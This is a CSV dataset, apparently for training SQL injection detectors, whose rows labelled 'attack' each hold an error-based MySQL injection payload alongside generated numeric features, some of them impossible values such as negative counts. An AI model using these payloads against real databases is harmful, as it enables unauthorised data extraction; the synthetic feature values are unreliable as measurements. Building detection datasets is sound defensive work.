id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001848,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.843581339541554,322.3198547363281,96.5912857055664,42.27312469482422,131.7960205078125,-9.337264060974121,112.64299774169922,35.95057678222656,0.4570193290710449,0.4116864502429962,0.1455288976430893,0.3806719481945038,0.1193712055683136,3.991366147994995,2.1039693355560303,1.6657719612121582,0.5289846658706665,0.11366091668605804,-0.0047273170202970505,-0.09190116822719574,11.91140079498291,8.745057106018066,6.363356113433838,0.2615227699279785,1.7521719932556152,0.23391848802566528,-0.7144002318382263,0.09006325155496597,-0.26021891832351685,1.5983415842056274,-0.2586301565170288,0.13133054971694946,1.2801642417907715,-0.38483336567878723,0.07151517271995544,2.540590286254883,7.105485439300537,0.8275244832038879,4.32003116607666,0.9757432341575623,0.06964201480150223,1.2654050588607788,-0.46350589394569397,-0.05732087045907974,0.1767883598804474,0.8028554916381836,0.10607543587684631,0.28210362792015076,0.48597973585128784,0.36055251955986023,0.19865040481090546,-0.18551044166088104,-0.6455613970756531,0.1862298846244812,1.37600839138031,0.19399666786193848,0.29109102487564087,0.5843860507011414,-0.2123565971851349,0.22531256079673767,0.987310528755188,0.32605671882629395,-0.7297092080116272,-0.10848340392112732,-0.022513216361403465,0.49212178587913513,0.4377783536911011,-0.32070866227149963,0.6542553901672363,-0.7184640765190125,-0.9895259141921997,-0.54240483045578,-0.6148584485054016,-0.16257847845554352,-0.04454248026013374,-0.4496706426143646,1.4800435304641724,0.6387361884117126,-0.3677757680416107,0.058340419083833694,0.9380908608436584,9.158381462097168,0.9263895153999329,0.07744666934013367,0.11866007000207901,0.5176907181739807,0.31003373861312866,0.020295215770602226,0.5218239426612854
GAN_001849,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.2619180698175105,295.2126159667969,84.50091552734375,43.52235794067383,120.3062973022461,-0.8346055746078491,92.35498809814453,33.20644760131836,0.7206588387489319,0.38616621494293213,0.1494622677564621,0.3932665288448334,0.11893656104803085,3.865963935852051,1.8313143253326416,1.0112371444702148,0.7713257074356079,0.18877068161964417,0.19575197994709015,0.06231467053294182,10.566632270812988,8.781851768493652,5.529793739318848,0.03826918825507164,2.077354669570923,0.12740634381771088,-0.2539365291595459,-0.1498706191778183,-0.09935254603624344,1.24015212059021,-0.2174532115459442,0.0017916969954967499,1.8784865140914917,-0.2601880729198456,0.21966885030269623,2.374105453491211,6.5747480392456055,1.1250252723693848,3.667222738265991,1.226984977722168,0.16246820986270905,0.8444876074790955,-0.3920571208000183,-0.01042752992361784,0.09864864498376846,0.4254702925682068,0.16647730767726898,0.1186148151755333,0.44692426919937134,0.21045005321502686,0.19062019884586334,-0.006795147899538279,-0.3916751742362976,0.031603164970874786,0.8961406350135803,0.13370007276535034,0.23975153267383575,0.4256642758846283,-0.37329742312431335,0.011943605728447437,0.3647898733615875,0.22186684608459473,-0.445035457611084,0.017047900706529617,-0.05328802019357681,0.4276060163974762,0.5911706686019897,-0.4616554379463196,0.38332200050354004,-0.6676807403564453,-0.7460893392562866,-0.3617642819881439,-0.20003710687160492,-0.356718510389328,-0.014018639922142029,-0.22469112277030945,1.2355287075042725,0.6899434924125671,-0.16659905016422272,0.0628882646560669,0.8369929790496826,9.584036827087402,0.8062284588813782,0.010611471720039845,0.12009492516517639,0.4129195511341095,0.3384122848510742,-0.21598798036575317,0.2986126244068146
GAN_001850,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,6.50081878628113,332.4369812011719,93.69631958007812,44.14151382446289,131.99549865722656,-12.75566577911377,113.30742645263672,34.27787780761719,0.5764195322990417,0.41576898097991943,0.14355942606925964,0.3665412664413452,0.1122366413474083,4.029417991638184,2.8756699562072754,1.832802176475525,0.1925363838672638,0.1942683905363083,-0.02906063385307789,-0.4631459712982178,11.368046760559082,8.389450073242188,6.721174716949463,0.30917733907699585,2.0818257331848145,0.332387238740921,-0.839637279510498,0.2303256392478943,-0.19695010781288147,1.6225426197052002,-0.5768260955810547,0.22610515356063843,1.0594635009765625,-0.33148741722106934,0.11626815795898438,2.579122304916382,6.505348205566406,0.8270094990730286,4.655257701873779,1.0737299919128418,0.10565287619829178,1.004514455795288,-0.34110161662101746,-0.07879806309938431,0.0025198571383953094,0.8854727149009705,0.2996053993701935,0.2784823477268219,0.6778442859649658,0.2211664766073227,0.2520974278450012,-0.15144561231136322,-0.6529042720794678,-0.26714032888412476,1.459230899810791,0.19568604230880737,0.3026461601257324,0.4994144141674042,0.053170204162597656,0.3515876233577728,0.5777355432510376,0.40376919507980347,-1.0886461734771729,-0.058545537292957306,-0.060451872646808624,0.5229001045227051,0.4009004533290863,-0.5682715773582458,0.7637207508087158,-0.8299365639686584,-1.3062489032745361,-0.6068409085273743,-0.3035842478275299,-0.3304201364517212,-0.05498194694519043,-0.976904571056366,1.5104975700378418,0.3639656603336334,-0.2790789306163788,0.09723757207393646,1.1095869541168213,9.024338722229004,0.7339537739753723,-0.010417225770652294,0.1443859040737152,0.619294285774231,-0.041419558227062225,-0.21806885302066803,0.958443284034729
GAN_001851,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""ymhg""  =  ""ymhg",nearest_attack_euclidean,R000085,8.141074473783046,341.77850341796875,91.02091217041016,54.87175750732422,147.8186798095703,-16.81365394592285,117.55583953857422,36.94131088256836,0.12083256244659424,0.42155659198760986,0.12763765454292297,0.3897243142127991,0.0974593535065651,3.8640387058258057,2.3254711627960205,2.2765026092529297,0.8731827735900879,0.30585241317749023,0.18723991513252258,-0.3668835163116455,13.090597152709961,9.718792915344238,6.973593711853027,0.23639188706874847,2.2565789222717285,0.15943874418735504,-0.6766441464424133,-0.08358918130397797,-0.21599283814430237,2.1683573722839355,-0.34869205951690674,0.18943510949611664,1.023513913154602,-0.40603822469711304,0.2415391504764557,2.9658217430114746,5.866097450256348,0.39879992604255676,5.704722881317139,2.530256748199463,-0.2870289385318756,0.7352755069732666,-0.5834068059921265,-0.06749048829078674,0.38720494508743286,0.7428664565086365,-0.07021662592887878,0.19428786635398865,0.7582554817199707,0.3609558045864105,0.12259819358587265,-0.14115561544895172,-0.7269077301025391,0.26085251569747925,1.6013290882110596,0.2951608896255493,0.4574826955795288,1.434931993484497,-0.14070722460746765,0.21080411970615387,1.0600143671035767,0.9275605082511902,-1.323487401008606,-0.1853833794593811,-0.11690683662891388,0.5994166731834412,0.12140007317066193,-1.39872407913208,0.5740537643432617,-0.8152268528938293,-1.5790759325027466,-0.4069406986236572,-0.24943026900291443,-0.7009361982345581,-0.02506434917449951,-0.558039128780365,1.6759346723556519,0.7872771620750427,-0.13608363270759583,0.1094239354133606,1.3765032291412354,8.683943748474121,0.7675954699516296,0.05987469479441643,0.1353587657213211,0.38122618198394775,0.36927589774131775,-0.14036355912685394,0.8153368830680847
GAN_001852,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.27071707897163,296.49139404296875,91.75849151611328,42.91423416137695,115.64791107177734,-5.044780731201172,108.60014343261719,34.272972106933594,0.3688153624534607,0.40838921070098877,0.13865455985069275,0.40296557545661926,0.11583979427814484,3.810235023498535,1.8256899118423462,1.5017181634902954,0.9829681515693665,0.2144225388765335,0.08918686211109161,0.07569446414709091,12.056885719299316,8.843032836914062,5.889864921569824,0.30648142099380493,2.0963938236236572,0.24298259615898132,-0.35870417952537537,-0.2559998035430908,-0.0967908576130867,1.4972559213638306,-0.07870897650718689,-0.0419863760471344,1.761043667793274,-0.4649682641029358,0.01727272756397724,2.5773255825042725,6.050609111785889,0.829830527305603,4.153500080108643,1.1902225017547607,0.11701766401529312,1.0351797342300415,-0.6923884749412537,-0.01750568114221096,-0.035464558750391006,0.399451345205307,0.26073378324508667,0.15138843655586243,0.4929589331150055,0.2515617907047272,0.021284541115164757,-0.0059412517584860325,-0.6072730422019958,0.1311398595571518,1.1096361875534058,0.20502454042434692,0.15998151898384094,1.0459107160568237,-0.5059061050415039,0.15887360274791718,0.5293362736701965,0.262218713760376,-0.5974036455154419,0.06847000122070312,-0.1309131532907486,0.6331639289855957,0.458144873380661,-0.6577612161636353,0.8132559061050415,-0.8660297989845276,-0.997779905796051,-0.5820497274398804,-0.23298943042755127,-0.5289158225059509,-0.04333098232746124,-0.4302184283733368,1.352583885192871,0.8720757961273193,0.04359833523631096,0.14548087120056152,0.8145767450332642,8.104249954223633,0.9305726885795593,-0.04459615424275398,0.19647905230522156,0.4119929075241089,0.36505836248397827,-0.43436160683631897,0.1734231412410736
GAN_001853,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.522110971935699,289.2555236816406,96.11056518554688,41.83872604370117,116.25792694091797,-8.234894752502441,99.4369125366211,33.85251998901367,0.4024956226348877,0.39466020464897156,0.14126242697238922,0.38660383224487305,0.11932411789894104,3.9196410179138184,2.0977535247802734,1.454007625579834,0.7269667387008667,0.19041474163532257,0.0913788303732872,-0.14011706411838531,11.597228050231934,9.296072006225586,5.418667793273926,0.3072711229324341,2.1474552154541016,0.2696453034877777,-0.44764283299446106,-0.012502629309892654,-0.04571902006864548,1.4127392768859863,-0.2153593897819519,-0.08763034641742706,1.4858237504959106,-0.20771752297878265,0.18221847712993622,2.4139750003814697,6.278097629547119,0.9694237112998962,3.633167266845703,1.024764895439148,0.08465329557657242,1.005387544631958,-0.4295221269130707,-0.028327034786343575,-0.12828120589256287,0.32901978492736816,0.0838996171951294,0.24141575396060944,0.5939376354217529,0.22722835838794708,0.19924843311309814,0.15251383185386658,-0.35827818512916565,0.13194821774959564,1.1351157426834106,0.18337705731391907,0.21406270563602448,0.6731380820274353,-0.3883620798587799,0.12365929037332535,0.34081485867500305,0.17489683628082275,-0.5478885173797607,0.06063948944211006,-0.07080893963575363,0.4429128170013428,0.5534495115280151,-0.5661537051200867,0.7104968428611755,-0.6731727719306946,-0.9699100255966187,-0.429569274187088,-0.06037534028291702,-0.29646036028862,-0.022895483300089836,-0.37121593952178955,1.5530844926834106,0.5848868489265442,-0.004757195711135864,0.11045075207948685,0.815784752368927,8.9171781539917,0.7897604703903198,0.09935489296913147,0.12638789415359497,0.4449436068534851,0.09708765149116516,-0.12538334727287292,0.2487102746963501
GAN_001854,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,6.41956474915283,310.1977233886719,93.78190612792969,50.52711486816406,131.2743377685547,-7.519067764282227,98.4791488647461,37.455421447753906,0.6845818758010864,0.38128364086151123,0.14773692190647125,0.3980500102043152,0.11029940098524094,3.8300530910491943,1.926743984222412,1.584418773651123,0.9411629438400269,0.27161577343940735,0.05913347005844116,-0.3236403465270996,11.954056739807129,10.770913124084473,5.639937400817871,0.06168084591627121,2.1069161891937256,0.18301086127758026,-0.3564237654209137,-0.005124050658196211,-0.20275050401687622,1.7005330324172974,0.012966852635145187,0.17672815918922424,1.1935244798660278,-0.29654398560523987,0.2971919775009155,2.6136515140533447,6.735062122344971,0.6424789428710938,4.66657829284668,1.2894290685653687,0.0314217284321785,0.6509392857551575,-0.41038259863853455,-0.017569025978446007,0.4378354251384735,0.32257866859436035,0.030180776491761208,0.33377841114997864,0.644548237323761,0.4424246549606323,0.23837311565876007,0.10097648948431015,-0.5363185405731201,0.421635240316391,1.2523856163024902,0.23051629960536957,0.25682133436203003,1.043978214263916,-0.05431913211941719,0.021960709244012833,0.9337087273597717,0.323770135641098,-0.9086262583732605,0.12031425535678864,-0.06783147156238556,0.5493972301483154,0.35774704813957214,-0.9601607918739319,0.5754391551017761,-0.8142715096473694,-1.0232465267181396,-0.3219524323940277,-0.07029283046722412,-0.523466944694519,-0.027645006775856018,-0.43847545981407166,1.410906434059143,0.7643572092056274,-0.12170901149511337,0.13482069969177246,0.9254024028778076,9.007919311523438,0.7678693532943726,0.09180737286806107,0.11499826610088348,0.3367711305618286,0.3606428802013397,-0.17778979241847992,0.17556078732013702
GAN_001855,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000126,6.467347852581487,335.802978515625,100.29327392578125,50.58055877685547,137.53424072265625,-7.5186004638671875,113.8224868774414,36.82939910888672,0.45737677812576294,0.4132378101348877,0.14048221707344055,0.3915103077888489,0.11112724244594574,3.920609951019287,2.5059382915496826,1.5324609279632568,0.9496128559112549,0.14183290302753448,0.31230098009109497,-0.06795883923768997,12.782018661499023,10.958891868591309,6.701501846313477,0.27812978625297546,2.2018866539001465,0.2777193486690521,-0.30792945623397827,0.05929684266448021,-0.19261682033538818,1.9924252033233643,-0.34134212136268616,0.0006929002702236176,1.207487940788269,-0.2769637405872345,0.3015497922897339,2.6943211555480957,7.456805229187012,0.48131123185157776,4.887574672698975,1.4299225807189941,0.04343829303979874,0.7294764518737793,-0.2930268943309784,-0.07389270514249802,0.575710654258728,0.3665177822113037,-0.18735812604427338,0.27944618463516235,0.6181288957595825,0.3182803988456726,0.2875126004219055,0.1420278549194336,-0.5424277782440186,0.24930550158023834,1.4336916208267212,0.21180258691310883,0.2282221019268036,0.7298158407211304,-0.17979854345321655,-0.023941628634929657,0.679002583026886,0.2653387188911438,-1.017996907234192,-0.08399923145771027,-0.027418723329901695,0.7894873023033142,0.4350096583366394,-0.8467774987220764,0.8218138813972473,-0.4534616768360138,-1.1209805011749268,-0.5854095220565796,-0.20602230727672577,-0.3275251090526581,-0.04064963757991791,-0.6588855385780334,1.6423275470733643,0.5885787010192871,0.10557297617197037,0.07022810727357864,1.0151599645614624,10.778273582458496,0.6988927721977234,0.237137570977211,0.1502949595451355,0.36424577236175537,0.5782327651977539,-0.08071921765804291,0.39952102303504944
GAN_001856,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,7.526637776003169,334.8774108886719,84.39682006835938,60.11005783081055,161.6830596923828,-15.657013893127441,97.24439239501953,39.579193115234375,0.445462703704834,0.36727362871170044,0.14325949549674988,0.4013921618461609,0.10413417220115662,3.927055835723877,1.8264282941818237,2.327317237854004,0.6160070300102234,0.3704437017440796,0.09303018450737,-0.6044824719429016,12.844026565551758,13.005590438842773,6.510408878326416,0.3567233681678772,2.076002597808838,0.26779448986053467,-0.3403915464878082,0.06907664239406586,-0.2298683226108551,2.260314702987671,-0.23498061299324036,0.5418776273727417,0.8960593938827515,-0.66745525598526,0.3699823021888733,3.096493721008301,7.505780220031738,0.23656663298606873,6.263045787811279,2.002911329269409,-0.029627405107021332,0.3491407334804535,-0.22030332684516907,-0.09091950953006744,1.0191887617111206,0.3304402232170105,-0.2635571360588074,0.5505421161651611,0.6804201602935791,0.8456444144248962,0.20335160195827484,0.06532656401395798,-0.6847728490829468,0.7194980382919312,1.5380855798721313,0.26730877161026,0.34963685274124146,0.9758840203285217,0.31539130210876465,-0.07866452634334564,1.208988904953003,0.7098166346549988,-1.1897549629211426,0.5505154132843018,-0.012877942994236946,0.8827278017997742,0.10613413155078888,-1.2933486700057983,0.34910136461257935,-0.7601518034934998,-1.0659184455871582,-0.14373378455638885,-0.405196875333786,-0.24203410744667053,-0.03518293797969818,-0.5052919983863831,1.6233867406845093,0.8686419725418091,-0.2299368530511856,0.16401448845863342,0.9479588866233826,10.255168914794922,0.8272050619125366,0.28958141803741455,0.11128801107406616,0.204921692609787,0.7779262065887451,-0.24492479860782623,0.5178089737892151
GAN_001857,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.833225145074965,311.0165710449219,82.55449676513672,40.36764907836914,127.28466033935547,-9.923832893371582,93.06056213378906,28.343778610229492,0.4740681052207947,0.4215351939201355,0.13782818615436554,0.39306220412254333,0.1233367845416069,3.942530393600464,2.49067759513855,1.2599596977233887,0.49677619338035583,0.33499735593795776,0.3657616078853607,-0.12275492399930954,10.35297679901123,6.083267688751221,5.426234245300293,0.056363727897405624,2.2835617065429688,-0.1084708571434021,-0.49214687943458557,-0.5923789739608765,-0.28990834951400757,1.25515878200531,-0.36175188422203064,-0.003444962203502655,1.8122196197509766,-0.4434007704257965,0.21258759498596191,2.4982662200927734,4.255027770996094,1.0281636714935303,3.8547306060791016,1.9380013942718506,-0.24063518643379211,0.4864351749420166,-0.6232698559761047,-0.023195931687951088,0.013882283121347427,0.7423658967018127,0.25602471828460693,0.07249139994382858,0.5383471250534058,0.009353448636829853,0.10712891072034836,-0.399831622838974,-0.4612952470779419,-0.006225598976016045,1.056130051612854,0.175614595413208,0.3558065593242645,1.1319739818572998,-0.6188787817955017,0.15768764913082123,0.5036274194717407,0.3795841336250305,-0.6872650980949402,0.09091918170452118,-0.07626128196716309,0.382174015045166,0.43880826234817505,-0.9743995070457458,0.8123127818107605,-1.026331901550293,-1.3329617977142334,-0.3388671576976776,-0.22878940403461456,-0.8510311245918274,-0.02517014369368553,-0.19562265276908875,1.3947556018829346,0.9903653860092163,-0.24193012714385986,0.003568566869944334,1.1266305446624756,9.728558540344238,0.9092979431152344,-0.1943274736404419,0.1472487896680832,0.24003052711486816,0.38896429538726807,-0.6320329904556274,0.513614296913147
GAN_001858,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,6.275430380713954,307.4669189453125,83.59437561035156,50.54767990112305,130.75558471679688,-7.3828935623168945,93.56253051757812,37.28691101074219,0.5416452884674072,0.36911144852638245,0.14447744190692902,0.4005701243877411,0.11462926864624023,3.8341968059539795,2.26546573638916,1.5227911472320557,0.7541506290435791,0.23856128752231598,0.04262010380625725,-0.05900704115629196,12.072942733764648,11.28782844543457,5.5077714920043945,0.19480353593826294,2.025111198425293,0.2590826749801636,-0.4219633936882019,0.03074110671877861,-0.040614716708660126,1.439290165901184,-0.10932759940624237,0.06794744729995728,1.4900310039520264,-0.42244645953178406,0.3433244526386261,2.7295727729797363,7.096759796142578,0.8048872947692871,4.66016960144043,1.3682961463928223,0.12607549130916595,0.678046464920044,-0.37759512662887573,-0.048434242606163025,0.47177308797836304,0.3154684007167816,-0.0368175245821476,0.25666001439094543,0.5002139210700989,0.46772637963294983,0.2324260026216507,0.1932740956544876,-0.3927825391292572,0.25741735100746155,1.1621816158294678,0.16295059025287628,0.13300131261348724,0.8850063681602478,-0.055118221789598465,0.12779247760772705,0.6137511134147644,0.5388275384902954,-0.829716682434082,-0.03358989953994751,-0.03509468212723732,0.5899307727813721,0.37142300605773926,-0.9754602313041687,0.23020415008068085,-0.48121291399002075,-0.8716583251953125,-0.32924744486808777,-0.20844948291778564,-0.5328543186187744,-0.00900402944535017,-0.28601741790771484,1.4452176094055176,0.607930600643158,0.12234065681695938,0.1839906871318817,0.8784928917884827,9.914189338684082,0.6536524295806885,0.14640295505523682,0.13903173804283142,0.3818933367729187,0.27687108516693115,-0.31471213698387146,0.5361714363098145
GAN_001859,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,7.172936286074185,317.36712646484375,81.18617248535156,47.924400329589844,140.61953735351562,-9.069040298461914,89.63573455810547,33.48933792114258,0.5304912328720093,0.40789851546287537,0.1350940614938736,0.3904852569103241,0.11067170649766922,3.89998197555542,2.1824169158935547,1.9206571578979492,0.6432868242263794,0.37588170170783997,0.26906082034111023,-0.4526074230670929,12.453896522521973,9.80636215209961,5.638408660888672,0.06490646302700043,2.116138458251953,0.11621344089508057,-0.34170976281166077,-0.13555176556110382,-0.2213529646396637,1.6151175498962402,-0.570563554763794,0.11910192668437958,1.2202471494674683,-0.3594032824039459,0.32646024227142334,2.7744293212890625,6.693990707397461,1.0863754749298096,4.7863922119140625,1.8261024951934814,-0.04889639467000961,0.43678903579711914,-0.21300581097602844,-0.07576654851436615,0.2618193030357361,0.48764675855636597,0.06524626910686493,0.2451208084821701,0.717300534248352,0.43085208535194397,0.23551756143569946,-0.023173103109002113,-0.44937488436698914,0.24152758717536926,1.250585675239563,0.17156051099300385,0.3331953287124634,0.8679487705230713,-0.34164026379585266,-0.10907816886901855,0.9427585005760193,0.5257480144500732,-0.9119212031364441,0.46605855226516724,-0.074222132563591,0.7377489805221558,0.37646347284317017,-1.2750370502471924,0.4655366539955139,-1.0562611818313599,-1.324008584022522,-0.3483613431453705,-0.13320665061473846,-0.3177243769168854,-0.023260286077857018,-0.5802357792854309,1.5577750205993652,0.7186955809593201,-0.2373494952917099,0.04788511246442795,1.2151286602020264,9.694575309753418,0.6573017239570618,0.0293014757335186,0.1401997208595276,0.19311457872390747,0.5046607255935669,-0.3904798626899719,0.7136014699935913
GAN_001860,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.229022060937487,307.5256652832031,99.32603454589844,40.306880950927734,114.6602783203125,-6.361225128173828,124.30892181396484,34.759796142578125,0.43258416652679443,0.4264034926891327,0.12880320847034454,0.39162158966064453,0.11554038524627686,3.8950448036193848,2.3888702392578125,1.4598525762557983,0.8657544255256653,0.13887083530426025,-0.04720143973827362,-0.0839986577630043,12.249066352844238,8.007884979248047,6.330573081970215,0.4869927763938904,2.2034261226654053,0.3143936097621918,-0.5165672898292542,-0.002511922037228942,-0.10782300680875778,1.9143030643463135,-0.009375955909490585,0.1083359569311142,1.5621272325515747,-0.4824483096599579,-0.06587420403957367,2.5375986099243164,5.887821674346924,0.7422598004341125,4.253746509552002,1.215035080909729,0.113039530813694,1.388842225074768,-0.7046062350273132,-0.03396028280258179,0.0631575956940651,0.6194149851799011,0.08950896561145782,0.19949357211589813,0.5170139670372009,0.20612049102783203,0.07076986879110336,-0.044618140906095505,-0.7188994884490967,0.2796888053417206,1.3961389064788818,0.2088094800710678,0.15633361041545868,0.785620391368866,-0.4037259817123413,0.14149540662765503,0.6184172034263611,0.40526050329208374,-0.5105069875717163,-0.19274522364139557,-0.10971586406230927,0.3860165476799011,0.4110979735851288,-0.339289128780365,1.0303215980529785,-0.8284661769866943,-1.0531233549118042,-0.6915557980537415,-0.2451452910900116,-0.38202083110809326,-0.060016945004463196,-0.6918154358863831,1.6477223634719849,0.6862737536430359,0.07320170104503632,0.09934987872838974,0.9867521524429321,7.7031989097595215,1.0089197158813477,0.03016715869307518,0.20030240714550018,0.5720340013504028,0.11851327121257782,-0.001003071665763855,0.20858246088027954
